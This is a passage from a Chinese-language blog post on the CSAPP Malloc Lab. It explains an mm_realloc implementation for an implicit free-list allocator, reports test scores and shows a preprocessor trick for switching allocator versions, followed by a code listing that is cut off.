为空或 <code>size</code> 为 0 时有特殊作用，这部分比较简单，下面只讨论普遍的情况：</p><p>虽说是用户调整块大小，但块大小仍然要保持 8 字节对齐，因此首要工作是计算实际调整后的块大小 <code>asize</code> 的值。随后根据 <code>asize</code> 与原始块的大小 <code>osize</code> 进行比较，根据三种不同情况分别进行处理：</p><ol><li><code>osize == asize</code>：此时不变，返回 <code>ptr</code> 即可。</li><li><code>osize &gt; asize</code>：块进行收缩，需要将其进行分割，回想前面实现的 <code>place</code> 作用正好就是分割块，因此直接调用后返回 <code>ptr</code> 即可。</li><li><code>osize &lt; asize</code>：块进行扩张，有三种解决方式：<ol><li>首先可以尝试合并相邻块，但由于要保证块调整后数据的完整性，因此合并前一块的操作略显麻烦，需要将数据整个进行移动，且同时也会引入额外的时间开销。这里为了实现的简单，只考虑对后一块进行合并，这样就只需要调整首尾块大小，而不需要对内存载荷做任何修改。</li><li>若无可合并的块或合并后块大小仍然不足，则遍历整个空闲链表，找到块大小大于等于 <code>asize</code> 的块，使用 <code>place</code> 对其进行分割，并使用 <code>memcpy</code> 将原始块的数据拷贝至新块中。最后，<strong>极其关键</strong> 的一点，需要将原始块进行释放，否则将会出现内存耗尽的错误，我就忽视了这一点，debug 了很长时间…</li><li>若空闲链表中找不到满足条件的块，则使用 <code>extend_heap</code> 对堆进行扩展，后续的操作与 (2) 相同。</li></ol></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mm_realloc</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> osize<span class="token punctuation">,</span> asize<span class="token punctuation">;</span>    <span class="token class-name">size_t</span> extendsize<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">mm_malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">mm_free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 调整块大小以对齐</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&lt;</span> DSIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        asize <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> DSIZE<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        asize <span class="token operator">=</span> DSIZE <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size <span class="token operator">+</span> <span class="token punctuation">(</span>DSIZE<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>DSIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> DSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    osize <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>osize <span class="token operator">==</span> asize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 不变</span>        bp <span class="token operator">=</span> ptr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>osize <span class="token operator">></span> asize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 收缩，进行分割</span>        <span class="token function">place</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>        bp <span class="token operator">=</span> ptr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                     <span class="token comment">// 扩张，首先尝试合并相邻块，若相邻块已分配或合并后仍然不够，</span>                                 <span class="token comment">// 则尝试查找新块，若找不到，则进行堆空间的申请</span>        <span class="token comment">// 合并相邻块（简化版：只合并后续块）</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            osize <span class="token operator">+=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>osize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>osize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>osize <span class="token operator">>=</span> asize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                         <span class="token comment">// 合并后足够分配</span>            <span class="token function">place</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>            bp <span class="token operator">=</span> ptr<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">find_fit</span><span class="token punctuation">(</span>asize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 合并后仍然不够，查找新块</span>            <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">memcpy</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> <span class="token function">MIN</span><span class="token punctuation">(</span>osize<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">mm_free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                      <span class="token comment">// 未匹配任何块，申请更多内存</span>            extendsize <span class="token operator">=</span> <span class="token function">MAX</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> CHUNKSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">extend_heap</span><span class="token punctuation">(</span>extendsize <span class="token operator">/</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">memcpy</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> <span class="token function">MIN</span><span class="token punctuation">(</span>osize<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">mm_free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> bp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h3><p>最终经过测试，隐式空闲链表的得分如下所示。其中内存利用率得分为 46 分（满分 60 分），意外的还不错。性能得分起伏较大，分数在 20~35 分（满分 40 分）不等，这部分感觉比较玄学。</p><p><img src="/2025/01/10/CSAPP-Malloc-Lab/implist-score.png" alt></p><h3 id="小技巧：如何切换不同的mm-c实现"><a href="#小技巧：如何切换不同的mm-c实现" class="headerlink" title="小技巧：如何切换不同的mm.c实现"></a>小技巧：如何切换不同的<code>mm.c</code>实现</h3><p>本 Lab 可能需要写多个不同版本的 <code>mm.c</code>，进行效率得分的比对，如何在不同的 <code>mm.c</code> 实现中切换值得一说。</p><p>起初我的设想是使用宏控制不同 <code>mm.c</code> 源文件的预处理，并将它们（例如 <code>mm-imp.c</code>、<code>mm-ex.c</code>）都写入 Makefile 中同时编译，但这样又得分别编写各自的编译行为，比较麻烦。</p><p>最后想到将 <code>mm-imp.c</code> 和 <code>mm-ex.c</code> 视作文本文件，不进行编译，而是供实际编译的 <code>mm.c</code> 借助预处理器选择性导入：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/* mm.c */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token number">0</span></span></span>    <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"mm-imp.c"</span>  <span class="token comment">// 启用隐式空闲链表</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>    <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"mm-ex.c"</span>   <span class="token comment">// 启用显式空闲链表</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span></code></pre><p>这样在每次在显式和隐式实现中切换时就只需要更改 <code>#if</code> 后的 0 和 1 了。</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/* single word (4) or double word (8) alignment */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ALIGNMENT</span> <span class="token expression"><span class="token number">8</span></span></span><span class="token comment">/* rounds up to the nearest multiple of ALIGNMENT */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">ALIGN</span><span class="token expression"><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>ALIGNMENT <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0x7</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SIZE_T_SIZE</span> <span class="token expression"><span class="token punctuation">(</span><span class="token function">ALIGN</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token comment">/* Basic constants and macros */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">WSIZE</span> <span class="token expression"><span class="token number">4</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DSIZE</span> <span class="token expression"><span class="token number">8</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CHUNKSIZE</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">12</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">MAX</span><span class="token expression"><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span>y<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">MIN</span><span class="token expression"><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token punctuation">(</span>y<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token comment">/* Pack and write a word at address p */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PACK</span><span class="token expression"><span class="token punctuation">(</span>size<span class="token punctuation">,</span> alloc<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>alloc<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token comment">/* Read and write a word at address p */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GET</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PUT</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">,</span> val<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token comment">/* Read the size and allocated fields from address p */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GET_SIZE</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">GET</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0x7</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GET_ALLOC</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">GET</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x1</span><span class="token punctuation">)</span></span></span><span class="token comment">/* Given block ptr bp, compute address of its header and footer */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">HDRP</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> WSIZE<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">FTRP</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> DSIZE<span class="token punctuation">)</span></span></span><span class="token comment">/* Given block ptr bp, compute address of next and previous blocks */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">NEXT_BLKP</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PREV_BLKP</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> DSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span>heap_listp<span class="token punctuation">;</span>  <span class="token comment">// 堆链表</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">extend_heap</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> words<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">coalesce</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">find_fit</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">place</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">,</span> <span class="token class-name">size_t</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">mm_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 创建初始堆链表</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>heap_listp <span class="token operator">=</span> <span class="token function">mem_sbrk</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span>heap_listp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span>heap_listp <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>DSIZE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// prologue header</span>    <span class="token function">PUT</span><span class="token punctuation">(</span>heap_listp <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>DSIZE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// prologue footer</span>    <span class="token function">PUT</span><span class="token punctuation">(</span>heap_listp <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// epilogue header</span>    heap_listp <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 使用 CHUNKSIZE 字节大小的块扩展堆链表</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">extend_heap</span><span class="token punctuation">(</span>CHUNKSIZE <span class="token operator">/</span> WSIZE<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mm_malloc</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> asize<span class="token punctuation">;</span>    <span class="token class-name">size_t</span> extendsize<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 调整块大小以对齐</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&lt;</span> DSIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        asize <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> DSIZE<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        asize <span class="token operator">=</span> DSIZE <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size <span class="token operator">+</span> <span class="token punctuation">(</span>DSIZE<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>DSIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> DSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 搜索堆链表进行匹配</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">find_fit</span><span class="token punctuation">(</span>asize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> bp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 未匹配任何块，申请更多内存</span>    extendsize <span class="token operator">=</span> <span class="token function">MAX</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> CHUNKSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">extend_heap</span><span class="token punctuation">(</span>extendsize <span class="token operator">/</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> bp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">mm_free</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">coalesce</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mm_realloc</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> osize<span class="token punctuation">,</span> asize<span class="token punctuation">;</span>    <span class="token class-name">size_t</span> extendsize<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ptr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">mm_malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">mm_free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 调整块大小以对齐</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&lt;</span> DSIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        asize <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> DSIZE<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        asize <span class="token operator">=</span> DSIZE <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token 